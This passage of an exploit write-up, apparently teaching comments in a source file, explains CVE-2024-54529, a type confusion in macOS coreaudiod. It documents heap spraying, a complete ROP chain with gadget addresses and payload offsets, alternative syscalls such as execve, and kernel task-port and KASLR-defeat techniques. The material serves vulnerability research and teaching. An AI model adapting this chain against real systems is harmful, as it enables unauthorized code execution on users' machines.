 *   - Field at offset X in A â‰  field at offset X in B
 *   - Deterministic (same input = same behavior)
 *   - Fully controlled (we choose which object)
 *
 * INTRA-CHUNK vs INTER-CHUNK:
 *
 *   "Intra-chunk heap overflow: extremely powerful because memory
 *    corruption does not cross a heap chunk. All uncertainty from
 *    unknown heap state is eliminated."
 *
 *   Our exploit is effectively intra-object:
 *   - We control the object in the slot
 *   - No heap boundary crossing
 *   - Deterministic access to our payload
 *
 * -----------------------------------------------------------------------------
 * U.2 CVE-2024-54529 SPECIFICS
 * -----------------------------------------------------------------------------
 *
 * OBJECT SIZE DIFFERENTIAL:
 *
 *   From Project Zero bug tracker:
 *   "clnt" object: 0x158 bytes
 *   "ioct" object: 0xE0 bytes
 *
 *   Handler expects ioct (0xE0), but may get larger object.
 *   Offset 0x68 is within bounds of both.
 *   BUT: data at 0x68 has different meaning!
 *
 * VULNERABLE CODE PATTERN:
 *
 *   // Handler assumes IOContext type
 *   void *ptr = *(void**)(obj + 0x68);  // BAD: no type check
 *   void (*func)() = *(void**)(ptr + 0x168);
 *   func();  // RCE if ptr controlled
 *
 * PATCHED CODE PATTERN:
 *
 *   // Type check added in patch
 *   if (obj->type != "ioct") {
 *       return error;  // Bail if wrong type
 *   }
 *   void *ptr = *(void**)(obj + 0x68);  // Now safe
 *
 * WHY 0x68 AND 0x168?
 *
 *   In IOContext:
 *     offset 0x68 = pointer to workgroup structure
 *     workgroup+0x168 = function pointer for fetch
 *
 *   In our controlled memory:
 *     offset 0x68 = points to our fake "vtable"
 *     fake_vtable+0x168 = stack pivot gadget
 *
 * -----------------------------------------------------------------------------
 * U.3 EXPLOITATION STRATEGY
 * -----------------------------------------------------------------------------
 *
 * CLASSIC TYPE CONFUSION EXPLOITATION:
 *
 *   1. PREPARE: Place controlled data at known memory
 *   2. CONFUSE: Trigger type confusion (wrong object fetched)
 *   3. DEREFERENCE: Code reads our data as pointers
 *   4. REDIRECT: Function pointer in our data called
 *   5. EXECUTE: ROP chain / shellcode runs
 *
 * THIS EXPLOIT'S APPROACH:
 *
 *   1. PREPARE:
 *      - Spray heap with CFString backing buffers
 *      - Each buffer = 1152 bytes of ROP payload
 *      - Payload includes fake vtable at offset 0x168
 *
 *   2. CREATE HOLES:
 *      - Free some CFStrings (holes in heap)
 *      - Payload data REMAINS in freed slots
 *
 *   3. PLACE VULNERABLE OBJECT:
 *      - Create Engine object
 *      - May reuse freed slot (contains payload)
 *      - Object partially overwrites payload
 *
 *   4. TRIGGER:
 *      - Send message 1010059 with Engine object ID
 *      - Handler fetches Engine, expects IOContext
 *      - Reads offset 0x68 -> our controlled value
 *      - Reads 0x168 from that -> stack pivot gadget
 *      - Calls gadget -> RSP = our buffer
 *
 *   5. ROP CHAIN EXECUTES:
 *      - Gadgets set up syscall arguments
 *      - open() creates file (proof of execution)
 *
 * =============================================================================
 * =============================================================================
 * SECTION V: TASK PORT EXPLOITATION CONTEXT
 * =============================================================================
 * =============================================================================
 *
 * Reference:
 *   - Project Zero: "task_t considered harmful"
 *     https://projectzero.google/2016/10/taskt-considered-harmful.html
 *   - CVE-2016-7613 (related task_t vulnerability)
 *
 * -----------------------------------------------------------------------------
 * V.1 WHY TASK PORTS MATTER
 * -----------------------------------------------------------------------------
 *
 * From Project Zero:
 *
 * "Task ports give you complete control over other tasks."
 *
 * "Every single task_t pointer in the kernel is a potential
 *  security bug."
 *
 * TASK PORT CAPABILITIES:
 *
 *   With send right to task port, you can:
 *   - Read/write all task memory (mach_vm_read/write)
 *   - Create/destroy threads
 *   - Modify register state
 *   - Access all task ports
 *
 * tfp0 (TASK FOR PID 0):
 *
 *   Task port for kernel_task = complete kernel control.
 *   This is the "holy grail" of macOS/iOS exploitation.
 *
 * RELEVANCE TO CVE-2024-54529:
 *
 *   audiohald runs as _coreaudiod (not root, not kernel).
 *   BUT: audiohald has access to audio hardware
 *   AND: can potentially access other processes' audio
 *   AND: is a stepping stone for further exploitation
 *
 * -----------------------------------------------------------------------------
 * V.2 CLASSIC TASK PORT EXPLOITATION
 * -----------------------------------------------------------------------------
 *
 * From Project Zero CVE-2016-7613 analysis:
 *
 * RACE CONDITION PATTERN:
 *
 *   "You cannot hold or use a task struct pointer and expect the
 *    euid of that task to stay the same."
 *
 *   Attack:
 *   1. Process A gets task_t pointer to Process B
 *   2. Process B executes SUID binary (becomes root)
 *   3. A's task_t pointer now references ROOT process!
 *   4. A can control the root process via task port
 *
 * KERNEL OBJECT CONFUSION:
 *
 *   ipc_port->ip_kobject points to kernel objects.
 *   Type determined by IKOT_* bits.
 *
 *   Attack:
 *   1. Create fake ipc_port in controlled memory
 *   2. Set ip_kobject to address of choice
 *   3. Set IKOT bits to desired type
 *   4. Trigger code that converts port to object
 *   5. Kernel uses our fake pointer!
 *
 * PRIMITIVES FROM TASK PORT:
 *
 *   Arbitrary read:  mach_vm_read(task_port, addr, size, &data)
 *   Arbitrary write: mach_vm_write(task_port, addr, data, size)
 *   Code execution:  thread_create + thread_set_state + thread_resume
 *
 * -----------------------------------------------------------------------------
 * V.3 KASLR DEFEAT TECHNIQUES
 * -----------------------------------------------------------------------------
 *
 * From Project Zero iOS chain:
 *
 * "clock_sleep_trap trick: port_name_to_clock() verifies IKOT_CLOCK
 *  kotype, then returns ip_kobject. Comparison against
 *  &clock_list[SYSTEM_CLOCK] fails for wrong KASLR slide.
 *  Only KERN_FAILURE indicates wrong guess. With 256 possible
 *  slides, brute-forcing is feasible."
 *
 * KASLR DEFEAT PATTERN:
 *
 *   1. Create fake IKOT_CLOCK port
 *   2. Set ip_kobject to guessed address
 *   3. Call clock_sleep_trap()
 *   4. KERN_FAILURE = wrong guess
 *   5. KERN_SUCCESS or other = correct slide!
 *   6. Only 256 guesses needed (KASLR entropy)
 *
 * ARBITRARY READ PRIMITIVE:
 *
 *   "pid_for_task() reads task->bsd_info (+0x360), then
 *    proc_pid() extracts p_pid (+0x10). By pointing fake
 *    task's ip_kobject to controlled memory, trap returns
 *    target 32-bit value."
 *
 *   This converts "fake port" to "read primitive".
 *
 * =============================================================================
 * =============================================================================
 * SECTION W: ROP CHAIN DEEP DIVE
 * =============================================================================
 * =============================================================================
 *
 * -----------------------------------------------------------------------------
 * W.1 GADGET ANALYSIS FROM build_rop.py
 * -----------------------------------------------------------------------------
 *
 * STACK PIVOT (Entry Point):
 *
 *   STACK_PIVOT_GADGET = 0x7ff810b908a4
 *   Instruction: xchg rsp, rax ; xor edx, edx ; ret
 *
 *   PURPOSE:
 *   - rax contains pointer to our controlled buffer
 *   - xchg swaps: rsp <-> rax
 *   - Now RSP points to our ROP chain!
 *   - xor edx, edx is side effect (harmless)
 *   - ret pops first gadget address and jumps
 *
 *   WHY THIS GADGET:
 *   - xchg rsp, rax is rare and valuable
 *   - Provides clean stack pivot
 *   - Located at offset 0x168 in payload (vtable offset)
 *
 * STRING ADDRESS CALCULATION:
 *
 *   LOAD_RSP_PLUS_EIGHT = 0x7ffd1491ac80
 *   Instruction: lea rax, [rsp + 8] ; ret
 *
 *   PURPOSE:
 *   - Calculate address of inline string
 *   - String starts 8 bytes after current RSP
 *   - Result in RAX for later use
 *
 *   ADD_HEX30_RSP = 0x7ff80f17d035
 *   Instruction: add rsp, 0x30 ; pop rbp ; ret
 *
 *   PURPOSE:
 *   - Skip over 0x30 bytes (inline string + padding)
 *   - pop rbp is side effect (we provide filler)
 *   - Continue to next gadget
 *
 * REGISTER SHUFFLING:
 *
 *   MOV_RAX_TO_RSI = 0x7ff80f41b060
 *   Instruction: mov rsi, rax ; mov rax, rsi ; pop rbp ; ret
 *
 *   MOV_RSI_TO_RDI = 0x7ff827af146d
 *   Instruction: mov rdi, rsi ; mov rax, rdi ; mov rdx, rdi ; ret
 *
 *   PURPOSE:
 *   - Move string address from RAX to RDI (first syscall arg)
 *   - Two-step: RAX -> RSI -> RDI
 *   - Extra mov instructions are side effects
 *
 * ARGUMENT SETUP:
 *
 *   POP_RSI_GADGET = 0x7ff811fa1e36
 *   Instruction: pop rsi ; ret
 *   VALUE: 0x201 (O_CREAT | O_WRONLY)
 *
 *   POP_RDX_GADGET = 0x7ff811cce418
 *   Instruction: pop rdx ; ret
 *   VALUE: 0x1A4 (0644 permissions)
 *
 *   POP_RAX_GADGET = 0x7ff811c93b09
 *   Instruction: pop rax ; ret
 *   VALUE: 0x2000005 (SYS_open)
 *
 * SYSCALL EXECUTION:
 *
 *   SYSCALL = 0x7ff80f1534d0
 *   Instruction: syscall
 *
 *   REGISTER STATE AT SYSCALL:
 *   rax = 0x2000005  (open syscall)
 *   rdi = &"/Library/Preferences/Audio/malicious.txt"
 *   rsi = 0x201      (O_CREAT | O_WRONLY)
 *   rdx = 0x1A4      (mode 0644)
 *
 * -----------------------------------------------------------------------------
 * W.2 PAYLOAD MEMORY LAYOUT (1152 bytes)
 * -----------------------------------------------------------------------------
 *
 * OFFSET  SIZE    CONTENT                      PURPOSE
 * ------  ----    -------                      -------
 * 0x000   8       LOAD_RSP_PLUS_EIGHT addr     First gadget after pivot
 * 0x008   8       ADD_HEX30_RSP addr           Skip string
 * 0x010   41      "/Library/.../malicious.txt" Inline filename
 * 0x039   15      0x42 padding                 Alignment + pop rbp filler
 * 0x048   8       MOV_RAX_TO_RSI addr          String addr to RSI
 * 0x050   8       0x4242424242424242           pop rbp filler
 * 0x058   8       MOV_RSI_TO_RDI addr          RSI to RDI (arg1)
 * 0x060   8       POP_RSI_GADGET addr          Load flags
 * 0x068   8       0x0000000000000201           O_CREAT | O_WRONLY
 * 0x070   8       POP_RDX_GADGET addr          Load mode
 * 0x078   8       0x00000000000001A4           0644
 * 0x080   8       POP_RAX_GADGET addr          Load syscall num
 * 0x088   8       0x0000000002000005           SYS_open
 * 0x090   8       SYSCALL addr                 Execute!
 * ...     ...     0x42 padding                 Fill to 1152
 * 0x168   8       STACK_PIVOT_GADGET addr      VTABLE ENTRY POINT
 * ...     ...     0x42 padding                 Continue to end
 * 0x47F   1       (end of 1152 bytes)
 *
 * WHY OFFSET 0x168 FOR ENTRY?
 *
 *   Vulnerable code does:
 *     ptr = *(void**)(obj + 0x68);
 *     func = *(void**)(ptr + 0x168);  // <-- THIS OFFSET
 *     func();
 *
 *   If ptr points to start of our payload:
 *     payload + 0x168 = STACK_PIVOT_GADGET address
 *     Call redirects to our gadget!
 *
 * -----------------------------------------------------------------------------
 * W.3 x86-64 macOS SYSCALL DETAILS
 * -----------------------------------------------------------------------------
 *
 * SYSCALL NUMBER ENCODING:
 *
 *   BSD syscalls use 0x2000000 class prefix.
 *
 *   From /usr/include/sys/syscall.h:
 *
 *   #define SYS_syscall     0
 *   #define SYS_exit        1
 *   #define SYS_fork        2
 *   #define SYS_read        3
 *   #define SYS_write       4
 *   #define SYS_open        5   <- We use this
 *   #define SYS_close       6
 *   ...
 *   #define SYS_mmap        197
 *   #define SYS_mprotect    74
 *   #define SYS_execve      59
 *
 *   Full syscall number = 0x2000000 + SYS_xxx
 *   open = 0x2000000 + 5 = 0x2000005
 *
 * ALTERNATIVE SYSCALLS FOR EXPLOITATION:
 *
 *   SYS_mprotect (0x200004a):
 *     Make heap executable, then jump to shellcode
 *     rdi = addr, rsi = size, rdx = PROT_READ|PROT_WRITE|PROT_EXEC
 *
 *   SYS_mmap (0x20000c5):
 *     Map executable memory at known address
 *     More complex (6 arguments)
 *
 *   SYS_execve (0x200003b):
 *     Execute arbitrary binary
 *     rdi = path, rsi = argv, rdx = envp
 *
 *   SYS_write (0x2000004):
 *     Write to file descriptor
 *     Could write to open file after open()
 *
 * =============================================================================
 * =============================================================================
 * SECTION X: ADVANCED RESEARCH REFERENCES
 * =============================================================================
 * =============================================================================
 *
 * -----------------------------------------------------------------------------
 * X.1 PROJECT ZERO PUBLICATIONS
 * -----------------------------------------------------------------------------
 *
 * CVE-2024-54529 (This Vulnerability):
 *   https://projectzero.google/2025/05/breaking-sound-barrier-part-i-fuzzing.html
 *   https://project-zero.issues.chromium.org/issues/372511888
 *
 * iOS Exploit Chain Analysis:
 *   https://projectzero.google/2019/08/in-wild-ios-exploit-chain-2.html
 *   Key techniques: IOSurface UAF, zone transfer, pipe buffers
 *
 * Task Port Exploitation:
 *   https://projectzero.google/2016/10/taskt-considered-harmful.html
 *   https://project-zero.issues.chromium.org/issues/42452370 (CVE-2016-7613)
 *   Key techniques: task_t pointer reuse, SUID race
 *
 * Memory Corruption Theory:
 *   https://projectzero.google/2015/06/what-is-good-memory-corruption.html
 *   Key concepts: reliability, determinism, intra-chunk vs inter-chunk
 *
 * -----------------------------------------------------------------------------
 * X.2 EXPLOITATION TECHNIQUE REFERENCES
 * -----------------------------------------------------------------------------
 *
 * Pwn2Own macOS:
 *   https://blog.ret2.io/2018/06/05/pwn2own-2018-exploit-development/
 *   Key techniques: WindowServer escape, JSC UAF
 *
 * Stefan Esser's OOL Ports:
 *   HITB 2017: "iOS 10 - Kernel Heap Revisited"
 *   Key technique: OOL port descriptors for fake objects
 *
 * Ian Beer's mach_portal:
 *   Project Zero blog and exploit code
 *   Key techniques: Port reference counting bugs
 *
 * Brandon Azad's voucher_swap:
 *   https://googleprojectzero.blogspot.com/2019/01/voucherswap-exploiting-mig-reference.html
 *   Key technique: MIG reference counting bugs
 *
 * -----------------------------------------------------------------------------
 * X.3 XNU SOURCE REFERENCES
 * -----------------------------------------------------------------------------
 *
 * Available at: https://opensource.apple.com/source/xnu/
 * Also in: references_and_notes/xnu/
 *
 * KEY FILES FOR IPC EXPLOITATION:
 *
 *   osfmk/ipc/ipc_port.c, .h    - Port structure and operations
 *   osfmk/ipc/ipc_kmsg.c, .h    - Kernel message handling
 *   osfmk/ipc/ipc_mqueue.c, .h  - Message queue operations
 *   osfmk/ipc/ipc_object.c, .h  - Base object operations
 *   osfmk/ipc/ipc_entry.c, .h   - IPC namespace entries
 *   osfmk/ipc/ipc_right.c, .h   - Port rights management
 *   osfmk/kern/ipc_kobject.c    - Kernel object wrapping
 *   osfmk/kern/task.c           - Task structure
 *
 * KEY FILES FOR MEMORY:
 *
 *   osfmk/vm/vm_map.c           - Virtual memory mapping
 *   osfmk/kern/kalloc.c         - Kernel allocator
 *   osfmk/kern/zalloc.c         - Zone allocator
 *
 * -----------------------------------------------------------------------------
 * X.4 TOOLS AND RESOURCES
 * -----------------------------------------------------------------------------
 *
 * ROP GADGET FINDING:
 *
 *   ROPgadget: https://github.com/JonathanSalwan/ROPgadget
 *     ROPgadget --binary /usr/lib/libSystem.B.dylib
 *
 *   Ropper: https://github.com/sashs/Ropper
 *     ropper -f /usr/lib/libSystem.B.dylib --search "pop rdi"
 *
 *   radare2: https://rada.re/
 *     r2 -A binary; /R pop rdi; ret
 *
 * REVERSE ENGINEERING:
 *
 *   Hopper Disassembler (macOS): https://www.hopperapp.com/
 *   IDA Pro: https://hex-rays.com/ida-pro/
 *   Ghidra: https://ghidra-sre.org/
 *   Binary Ninja: https://binary.ninja/
 *
 * DEBUGGING:
 *
 *   LLDB (Apple debugger): Built into Xcode
 *   dtrace: System tracing (requires SIP disabled)
 *   heap/vmmap/leaks: Memory analysis tools
 *   fs_usage: File system / Mach port tracing
 *
 * DYLD CACHE EXTRACTION:
 *
 *   dyld_shared_cache_util -extract /tmp/cache \
 *       /System/Library/dyld/dyld_shared_cache_x86_64h
 *
 *   ipsw dyldextract: https://github.com/blacktop/ipsw
 *
 * FUZZING:
 *
 *   TinyInst: https://github.com/googleprojectzero/TinyInst
 *   AFL++: https://github.com/AFLplusplus/AFLplusplus
 *   libFuzzer: Part of LLVM
 *   Jackalope: https://github.com/nicklockwood/Jackalope
 *
 * =============================================================================
 * =============================================================================
 * SECTION Y: PRESENTATION NOTES FOR ADVANCED AUDIENCE
 * =============================================================================
 * =============================================================================
 *
 * -----------------------------------------------------------------------------
 * Y.1 KEY TAKEAWAYS
 * -----------------------------------------------------------------------------
 *
 * 1. TYPE CONFUSION IN MIG SERVICES:
 *    - MIG-generated code trusts message parsing
 *    - No automatic type validation
 *    - Each handler must validate object types
 *    - HALS_ObjectMap::CopyObjectByObjectID returns untyped pointer
 *
 * 2. HEAP EXPLOITATION VIA PLIST:
 *    - Can't directly malloc in target
 *    - Plist parsing creates controlled allocations
 *    - CFString backing buffers = controlled heap
 *    - Size matching is critical for reuse
 *
 * 3. STACK PIVOT FOR ROP:
 *    - Can't overwrite return address (no stack overflow)
 *    - Hijack virtual call instead
 *    - Pivot stack to controlled memory
 *    - xchg rsp, rax is the key gadget
 *
 * 4. RELIABILITY THROUGH DETERMINISM:
 *    - Type confusion is deterministic
 *    - Same input = same behavior
 *    - Heap layout can be influenced
 *    - Multiple attempts improve success rate
 *
 * -----------------------------------------------------------------------------
 * Y.2 QUESTIONS TO EXPLORE
 * -----------------------------------------------------------------------------
 *
 * Q: Why not target the kernel directly?
 * A: audiohald is userspace, easier to exploit. Kernel requires
 *    additional primitives (tfp0) and bypasses (KTRR, PAC).
 *
 * Q: How do you find the gadget addresses?
 * A: Extract dyld shared cache, run ROPgadget, adjust for ASLR.
 *    Need info leak for reliable ASLR defeat in real exploit.
 *
 * Q: What about PAC on Apple Silicon?
 * A: PAC complicates exploitation. Need PAC signing oracle or
 *    bypass. x86-64 Macs don't have PAC.
 *
 * Q: Can this escape the sandbox?
 * A: audiohald is not sandboxed. Success here = unsandboxed
 *    code execution. Can be chained with kernel exploit.
 *
 * Q: How was the vulnerability found?
 * A: Fuzzing with TinyInst, API call chaining, manual analysis.
 *    2000% coverage improvement through iterative harness tuning.
 *
 * -----------------------------------------------------------------------------
 * Y.3 DEMONSTRATION FLOW
 * -----------------------------------------------------------------------------
 *
 * STEP 1: Show the Vulnerability
 *   - Run CVE PoC: crash audiohald
 *   - Show crash log with faulting instruction
 *   - Explain type confusion from log
 *
 * STEP 2: Build the Exploit
 *   - Run build_rop.py, show rop_payload.bin
 *   - Hexdump payload, identify key offsets
 *   - Compile exploit.mm
 *
 * STEP 3: Execute the Exploit
 *   - Run run_exploit.py
 *   - Watch heap spray messages
 *   - Wait for success indicator
 *   - Show /Library/Preferences/Audio/malicious.txt created
 *
 * STEP 4: Analyze Success
 *   - Show crash log if available
 *   - Trace execution through gadgets
 *   - Verify syscall executed
 *
 * =============================================================================
 * COMPLETE REFERENCE LIST
 * =============================================================================
 *
 * PROJECT ZERO:
 * - https://projectzero.google/2025/05/breaking-sound-barrier-part-i-fuzzing.html
 * - https://projectzero.google/2019/08/in-wild-ios-exploit-chain-2.html
 * - https://projectzero.google/2016/10/taskt-considered-harmful.html
 * - https://projectzero.google/2015/06/what-is-good-memory-corruption.html
 * - https://project-zero.issues.chromium.org/issues/372511888
 * - https://project-zero.issues.chromium.org/issues/42452370
 *
 * VULNERABILITY DATABASES:
 * - https://nvd.nist.gov/vuln/detail/CVE-2024-54529
 * - https://www.cvedetails.com/cve/CVE-2024-54529/
 *
 * EXPLOIT CODE:
 * - https://github.com/googleprojectzero/p0tools/tree/master/CoreAudioFuzz
 *
 * CONFERENCE PRESENTATIONS:
 * - https://blog.ret2.io/2018/06/05/pwn2own-2018-exploit-development/
 *
 * APPLE SOURCES:
 * - https://opensource.apple.com/source/xnu/
 * - /Applications/Xcode.app/.../SDKs/MacOSX.sdk/usr/include/mach/
 * - references_and_notes/xnu/osfmk/ipc/
 * - references_and_notes/MacOSX.platform/Developer/SDKs/
 *
 * =============================================================================
 * =============================================================================
 * PART 5: COREAUDIO ARCHITECTURE DEEP DIVE
 * =============================================================================
 * =============================================================================
 *
 * To exploit a system, you must first understand it deeply. This section
 * provides a comprehensive analysis of the CoreAudio architecture from
 * the perspective of a security researcher.
 *
 * -----------------------------------------------------------------------------
 * 5.1 THE COREAUDIO FRAMEWORK STACK
 * -----------------------------------------------------------------------------
 *
 * CoreAudio is Apple's low-level audio infrastructure. It provides:
 *   - Hardware abstraction for audio devices
 *   - Audio processing and mixing
 *   - MIDI support
 *   - Audio codec handling
 *
 * The stack consists of multiple layers:
 *
 *   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
 *   â”‚                     COREAUDIO STACK                                 â”‚
 *   â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
 *   â”‚                                                                     â”‚
 *   â”‚   USER SPACE (Application)                                          â”‚
 *   â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
 *   â”‚   â”‚  AVFoundation / AudioToolbox / CoreMIDI                     â”‚  â”‚
 *   â”‚   â”‚  High-level Objective-C/Swift APIs                          â”‚  â”‚
 *   â”‚   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
 *   â”‚                              â–¼                                      â”‚
 *   â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
 *   â”‚   â”‚  AudioUnit Framework                                        â”‚  â”‚
 *   â”‚   â”‚  Audio processing plugins, effects, instruments             â”‚  â”‚
 *   â”‚   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
 *   â”‚                              â–¼                                      â”‚
 *   â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
 *   â”‚   â”‚  CoreAudio.framework                                        â”‚  â”‚
 *   â”‚   â”‚  AudioHardware.h, AudioDevice APIs                          â”‚  â”‚
 *   â”‚   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
 *   â”‚                              â”‚                                      â”‚
 *   â”‚   â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• â”‚
 *   â”‚   â”‚  MACH IPC BOUNDARY    â”‚                                        â”‚
 *   â”‚   â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• â”‚
 *   â”‚                              â–¼                                      â”‚
 *   â”‚   USER SPACE (Daemon)                                               â”‚
 *   â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
 *   â”‚   â”‚  coreaudiod  (/usr/sbin/coreaudiod)                         â”‚  â”‚
 *   â”‚   â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚  â”‚
 *   â”‚   â”‚  â”‚  HARDWARE ABSTRACTION LAYER (HAL)                   â”‚   â”‚  â”‚
 *   â”‚   â”‚  â”‚  â”œâ”€â”€ HALS_System (singleton)                        â”‚   â”‚  â”‚
 *   â”‚   â”‚  â”‚  â”œâ”€â”€ HALS_Client (per-connection)                   â”‚   â”‚  â”‚
 *   â”‚   â”‚  â”‚  â”œâ”€â”€ HALS_Device (audio devices)                    â”‚   â”‚  â”‚
 *   â”‚   â”‚  â”‚  â”œâ”€â”€ HALS_Stream (audio streams)                    â”‚   â”‚  â”‚
 *   â”‚   â”‚  â”‚  â”œâ”€â”€ HALS_IOContext (I/O contexts) â—€â• Confused type â”‚   â”‚  â”‚
 *   â”‚   â”‚  â”‚  â”œâ”€â”€ HALS_Engine (audio engines)  â—€â• Our object     â”‚   â”‚  â”‚
 *   â”‚   â”‚  â”‚  â””â”€â”€ HALS_Object (base class)                       â”‚   â”‚  â”‚
 *   â”‚   â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚  â”‚
 *   â”‚   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
 *   â”‚                              â–¼                                      â”‚
 *   â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
 *   â”‚   â”‚  HAL Plugins  (/Library/Audio/Plug-Ins/HAL/ *.driver)       â”‚  â”‚
 *   â”‚   â”‚  Hardware-specific drivers loaded by coreaudiod             â”‚  â”‚
 *   â”‚   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
 *   â”‚                              â–¼                                      â”‚
 *   â”‚   KERNEL SPACE                                                      â”‚
 *   â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
 *   â”‚   â”‚  IOKit Audio Family                                         â”‚  â”‚
 *   â”‚   â”‚  IOAudioDevice, IOAudioStream, IOAudioEngine                â”‚  â”‚
 *   â”‚   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
 *   â”‚                              â–¼                                      â”‚
